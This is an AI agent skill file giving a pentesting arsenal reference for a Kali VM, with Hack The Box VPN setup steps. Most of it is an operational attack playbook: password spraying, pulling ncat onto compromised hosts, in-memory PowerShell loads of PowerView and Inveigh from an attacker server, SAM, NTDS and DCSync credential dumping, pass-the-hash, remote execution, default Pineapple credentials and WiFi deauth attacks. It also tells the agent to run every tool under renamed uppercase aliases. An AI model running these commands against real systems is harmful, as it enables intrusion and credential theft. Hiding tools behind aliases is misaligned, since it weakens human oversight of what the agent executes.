---
name: kali-arsenal
description: "Installed pentesting tools reference: SecLists, PayloadsAllTheThings, AutoRecon, Static Binaries, PowerSploit, Inveigh, Adalanche, NetExec, Impacket, Evil-WinRM, BloodHound. Paths, usage, and examples."
version: 1.0.0
author: chillspwn
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [kali, pentesting, tools, seclists, autorecon, impacket, netexec, evil-winrm, bloodhound, adalanche, powersploit, inveigh, static-binaries, payloadsallthethings, wordlists, payloads, post-exploitation, active-directory]
    related_skills: [robin, kali-tool-audit, godmode]
---

# Kali Arsenal — Installed GitHub Tools Reference

> This skill documents all pentesting tools installed from GitHub on this Kali VM.
> Use this reference for paths, when-to-use guidance, and command examples.
> These are your PRIMARY tools. Use them BEFORE reaching for Robin or any wrapper.

**Linked HTB workflow:** `references/htb-openvpn-workflow.md` covers the durable Hack The Box OpenVPN workflow: saving uploaded profiles, starting/stopping VPNs with PID files, avoiding unsafe broad `pkill -f` patterns, per-box workspace layout, and Starting Point-style FTP enumeration.

---

## 1. Payloads & Wordlists

### SecLists — `/opt/seclists` (also at `/usr/share/seclists`)
Massive collection of usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, and web shells.

**When to use:** ANY time you need a wordlist for brute-forcing, fuzzing, or enumeration.

**Key paths:**
- Passwords: `/opt/seclists/Passwords/` (includes `darkc0de.txt` with 1.47M entries)
- Common creds: `/opt/seclists/Passwords/Common-Credentials/10k-most-common.txt`
- Directory brute-forcing: `/opt/seclists/Discovery/Web-Content/`
- DNS wordlists: `/opt/seclists/Discovery/DNS/`
- Usernames: `/opt/seclists/Usernames/`
- Fuzzing payloads: `/opt/seclists/Fuzzing/`
- Web shells: `/opt/seclists/Web-Shells/`

**Example usage:**
```bash
# Directory brute-force with ffuf using SecLists
ffuf -u http://<target>/FUZZ -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Password spray with hydra
hydra -L /opt/seclists/Usernames/top-usernames-shortlist.txt -P /opt/seclists/Passwords/Common-Credentials/10k-most-common.txt <target> ssh

# DNS subdomain brute-force
gobuster dns -d <domain> -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### PayloadsAllTheThings — `/opt/payloadsallthethings`
Comprehensive repository of payloads and bypasses for web application security — an interactive giant cheat sheet for almost any attack vector.

**When to use:** When crafting or looking up payloads for a specific vulnerability class (SQLi, XSS, SSRF, LFI, RFI, command injection, etc.).

**Key directories:**
- SQL Injection: `/opt/payloadsallthethings/SQL Injection/`
- XSS: `/opt/payloadsallthethings/XSS Injection/`
- SSRF: `/opt/payloadsallthethings/Server Side Request Forgery/`
- Command Injection: `/opt/payloadsallthethings/Command Injection/`
- File Inclusion: `/opt/payloadsallthethings/File Inclusion/`
- SSTI: `/opt/payloadsallthethings/Server Side Template Injection/`

**Example usage:**
```bash
# Look up SQLi payloads for MySQL
cat "/opt/payloadsallthethings/SQL Injection/MySQL Injection.md"

# Find SSRF bypass techniques
cat "/opt/payloadsallthethings/Server Side Request Forgery/README.md"
```

---

## 2. Reconnaissance

### AutoRecon — `autorecon` (installed via pipx at `/root/.local/bin/autorecon`)
Multi-threaded network reconnaissance tool that performs automated enumeration of services. It runs nmap, feroxbuster, enum4linux, and more in the background, organizing output into a clean directory structure.

**When to use:** At the start of any engagement to automatically enumerate all services on target hosts. Saves significant time vs running tools individually.

**Example usage:**
```bash
# Full automated recon on a single target
autorecon <target_ip>

# Scan multiple targets from a file
autorecon -t targets.txt

# Specify output directory
autorecon <target_ip> -o /root/engagement/recon

# Limit concurrent scans
autorecon <target_ip> -m 5
```

**Output structure:** Results are saved per-target in organized directories — `scans/`, `loot/`, `exploit/` — making it easy to review findings.

### HackTheBox VPN + Starting Point workflow

When the user wants to solve HTB/Starting Point machines, actively prepare the VPN and workspace before waiting for the target IP.

1. Check OpenVPN and current tunnel state:
```bash
command -v openvpn && openvpn --version | head -3
ip -brief addr | grep -E 'tun|tap' || true
ip route | grep -E 'tun|10\.10\.|10\.129\.' || true
```

2. Create a standard workspace:
```bash
mkdir -p /root/htb/{vpn,boxes,challenges,loot,scans}
chmod 700 /root/htb /root/htb/vpn
```

3. If Telegram rejects `.ovpn` uploads, ask the user to rename it to `.txt`, zip it, or paste the contents. Save the received text document back to `.ovpn` with private permissions:
```bash
install -m 600 /root/.hermes/cache/documents/<uploaded>.txt /root/htb/vpn/htb.ovpn
```

4. Start OpenVPN and verify the tunnel:
```bash
/usr/sbin/openvpn --config /root/htb/vpn/htb.ovpn \
  --daemon htb-vpn \
  --writepid /root/htb/vpn/openvpn.pid \
  --log /root/htb/vpn/openvpn.log
sleep 8
ip -brief addr | grep -E 'tun|tap'
ip route | grep -E '10\.10\.|10\.129\.'
tail -80 /root/htb/vpn/openvpn.log
```

Success indicator: `Initialization Sequence Completed` and routes for HTB ranges such as `10.129.0.0/16` through `tun0`.

5. For spawned machines, immediately enumerate with Kali-native tools and store artifacts per target:
```bash
TARGET=<ip>
mkdir -p /root/htb/boxes/$TARGET/{scans,loot}
ping -c 2 -W 2 $TARGET || true
nmap -Pn --min-rate 5000 -p- --open -oN /root/htb/boxes/$TARGET/scans/nmap_fast.txt $TARGET
```

**Starting Point FTP pattern:** If only FTP is open, run `nmap -Pn -sCV -p21`, test anonymous login, list files, download readable flags into `/root/htb/boxes/$TARGET/loot/`, and explain the anonymous FTP misconfiguration.

**Pitfall:** Avoid broad `pkill -f "openvpn.*..."` patterns inside the same shell command that starts OpenVPN; the pattern can match the wrapper shell and terminate the tool run. Check existing processes first, then start with `--writepid` and manage by PID.

---

## 3. Post-Exploitation Toolkits

### Static Binaries — `/opt/static-binaries`
Pre-compiled, statically linked binaries (ncat, nmap, socat, etc.) for transferring to compromised targets that lack standard tools.

**When to use:** During post-exploitation when the target machine doesn't have the tools you need. These binaries run without any library dependencies.

**Key binaries:**
- `/opt/static-binaries/binaries/linux/x86_64/ncat` — Netcat (static, x86_64)
- `/opt/static-binaries/binaries/linux/x86_64/nmap` — Nmap (static)
- `/opt/static-binaries/binaries/linux/x86_64/socat` — Socat (static)
- Windows binaries: `/opt/static-binaries/binaries/windows/`

**Example usage:**
```bash
# Serve a static binary to a compromised host
python3 -m http.server 8080 --directory /opt/static-binaries/binaries/linux/x86_64/

# Transfer ncat to target via curl (run on target)
# curl http://<attacker_ip>:8080/ncat -o /tmp/ncat && chmod +x /tmp/ncat
```

### PowerSploit (PowerView) — `/opt/powersploit`
Archived but essential PowerShell post-exploitation framework. PowerView.ps1 alone contains 102 functions for deep Active Directory enumeration.

**When to use:** When you have a PowerShell session on a Windows target and need to enumerate AD objects, find domain trusts, identify group policies, or map attack paths.

**Key scripts:**
- `/opt/powersploit/Recon/PowerView.ps1` — AD enumeration (102 functions)
- `/opt/powersploit/Privesc/PowerUp.ps1` — Windows privilege escalation
- `/opt/powersploit/Exfiltration/` — Data exfiltration utilities
- `/opt/powersploit/CodeExecution/` — Code execution methods

**Example usage (serve to target):**
```bash
# Host PowerView for download
python3 -m http.server 8080 --directory /opt/powersploit/Recon/

# On target PowerShell:
# IEX (New-Object Net.WebClient).DownloadString('http://<attacker>:8080/PowerView.ps1')
# Get-DomainUser -SPN  # Find Kerberoastable accounts
# Get-DomainGroup -AdminCount  # Find privileged groups
# Find-LocalAdminAccess  # Find machines where current user is local admin
```

### Inveigh — `/opt/inveigh`
PowerShell/C# LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool. Captures NetNTLM hashes when users mistype server names or authenticate to non-existent resources.

**When to use:** During internal network assessments to passively capture NTLMv2 hashes via protocol poisoning. Alternative to Responder when you need a PowerShell-native solution.

**Key files:**
- `/opt/inveigh/Inveigh.ps1` — Main PowerShell script (73 functions, 303KB)
- `/opt/inveigh/Inveigh-Relay.ps1` — NTLM relay functionality

**Example usage (serve to target):**
```bash
# Host Inveigh for download
python3 -m http.server 8080 --directory /opt/inveigh/

# On target PowerShell:
# IEX (New-Object Net.WebClient).DownloadString('http://<attacker>:8080/Inveigh.ps1')
# Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -mDNS Y -NBNS Y
```

---

## 4. Active Directory Tools

### Adalanche — `/usr/local/bin/adalanche` (v2025.2.6)
Instantly reveals permissions in Active Directory environments. Lightweight alternative to BloodHound for visualizing access and finding misconfigurations without needing Neo4j.

**When to use:** Quick AD permission analysis — especially when you want fast results without setting up a full BloodHound/Neo4j stack.

**Example usage:**
```bash
# Collect AD data (run from domain-joined context or with creds)
adalanche collect activedirectory --domain <domain> --server <dc_ip> --username <user> --password <pass>

# Analyze collected data and start web UI
adalanche analyze --objects <data_dir>

# Quick help
adalanche --help
```

### NetExec (nxc) — Pre-installed (v1.5.1)
Modern successor to CrackMapExec. Swiss army knife for AD environments — password spraying, share enumeration, local admin checks, credential dumping.

**Example usage:**
```bash
# Check for local admin access across a subnet
nxc smb 192.168.1.0/24 -u <user> -p <pass>

# Password spray
nxc smb <dc_ip> -u users.txt -p passwords.txt --continue-on-success

# Dump SAM hashes
nxc smb <target> -u <admin> -p <pass> --sam

# Enumerate shares
nxc smb <target> -u <user> -p <pass> --shares
```

### Impacket — Pre-installed (v0.14.0)
Essential Python scripts for AD/Windows network protocols (SMB, MSRPC, Kerberos).

**Key scripts:**
```bash
# Kerberoasting
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request

# AS-REP Roasting
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc_ip>

# Dump NTDS.dit / SAM hashes (DCSync)
impacket-secretsdump <domain>/<user>:<pass>@<dc_ip>

# Remote command execution
impacket-psexec <domain>/<user>:<pass>@<target>
impacket-wmiexec <domain>/<user>:<pass>@<target>
impacket-smbexec <domain>/<user>:<pass>@<target>
```

### Evil-WinRM — Pre-installed (v3.9)
Powerful WinRM shell with built-in features for loading PS scripts into memory, file transfers, and AMSI bypass.

**Example usage:**
```bash
# Connect with password
evil-winrm -i <target> -u <user> -p <pass>

# Connect with hash (Pass-the-Hash)
evil-winrm -i <target> -u <user> -H <ntlm_hash>

# Load PowerShell scripts from a directory
evil-winrm -i <target> -u <user> -p <pass> -s /opt/powersploit/Recon/
```

### BloodHound — Pre-installed (v1.9.0)
Graph-theory based AD attack path mapper. Uses SharpHound collector to ingest domain data into Neo4j for visual analysis.

**Example usage:**
```bash
# Python-based collection (bloodhound-python)
bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc_ip> -c all

# Import JSON files into BloodHound GUI for analysis
```

---

## 6. Hardware Tools

### WiFi Pineapple (Hak5) — Available on LAN via SSH
Dedicated wireless auditing platform with monitor mode, packet injection, and rogue AP capabilities. Connect from Kali via SSH — bypasses the VM's lack of wireless hardware entirely.

**When to use:** WiFi reconnaissance, WPA2 handshake capture, PMKID harvesting, evil twin attacks, client deauthentication. ANY time you need raw WiFi radio access from the Kali VM.

**Connection:**
```bash
# Find Pineapple on LAN (default IP varies — DHCP or 172.16.42.1)
nmap -p 22 192.168.2.0/24 --open 2>/dev/null | grep -B3 "22/tcp"

# SSH in (Mark VII default: root / hak5pineapple)
ssh root@<pineapple_ip>

# Start monitor mode
airmon-ng start wlan0
airodump-ng wlan0mon      # Passive AP/client discovery
hcxdumptool -i wlan0mon    # PMKID harvesting (passive WPA2 attack)
```

**Models:** Mark VII (latest, web UI + SSH), Nano (compact), Tetra (dual-band, discontinued).

**Key advantage:** The Pineapple has dedicated radios. Use it over SSH from Kali instead of buying/passthrough-ing a USB WiFi adapter. See `network-attack-surface-mapping` skill (`references/wifi-hardware-options.md`) for full setup details including USB adapter alternatives.

---

## 7. ChillsPwn Arsenal Aliases (MANDATORY on this host)

This machine exposes every standard tool through UPPERCASE alias wrappers in `/opt/chillspwn-bin`
(on `$PATH`). **Always invoke the ALIAS, not the raw tool name** — it is the canonical,
pre-configured interface. Flags/arguments are identical; only the command name changes
(e.g. `SURFACE -sC -sV <ip>` instead of `nmap -sC -sV <ip>`).

The authoritative, always-current map lives at **`/opt/chillspwn-bin/ALIASES.md`** (generated from
the wrappers — read it for the full categorized list of all 97). Common ones:

| Alias | Tool | Alias | Tool | Alias | Tool |
|---|---|---|---|---|---|
| `SURFACE` | nmap | `GOTO` | nxc | `ENTER` | evil-winrm |
| `WIDE` | masscan | `PEEK` | rustscan | `SHARE` | smbclient |
| `MAP` | smbmap | `DOOR` | rpcclient | `LIST` | enum4linux |
| `STORE` | ldapsearch | `AD` | bloodyAD | `TRACE` | bloodhound-python |
| `ROAST` | impacket-GetUserSPNs | `ASREP` | impacket-GetNPUsers | `KEEP` | impacket-secretsdump |
| `STEP` | impacket-psexec | `TASK` | impacket-wmiexec | `KERBEROS` | impacket-getTGT |
| `SILVER` | impacket-getST | `DACL` | impacket-dacledit | `RBCD` | impacket-rbcd |
| `PKI` | certipy-ad | `DB` | impacket-mssqlclient | `RELAY` | impacket-ntlmrelayx |
| `MATCH` | hashcat | `GUESS` | john | `KUSER` | kerbrute |
| `TUN` | chisel | `CHAIN` | proxychains4 | `LISTEN` | responder |
| `BROWSE` | gobuster | `WALK` | feroxbuster | `SEEK` | ffuf |

To rediscover everything: `ls /opt/chillspwn-bin` or `cat /opt/chillspwn-bin/ALIASES.md`.
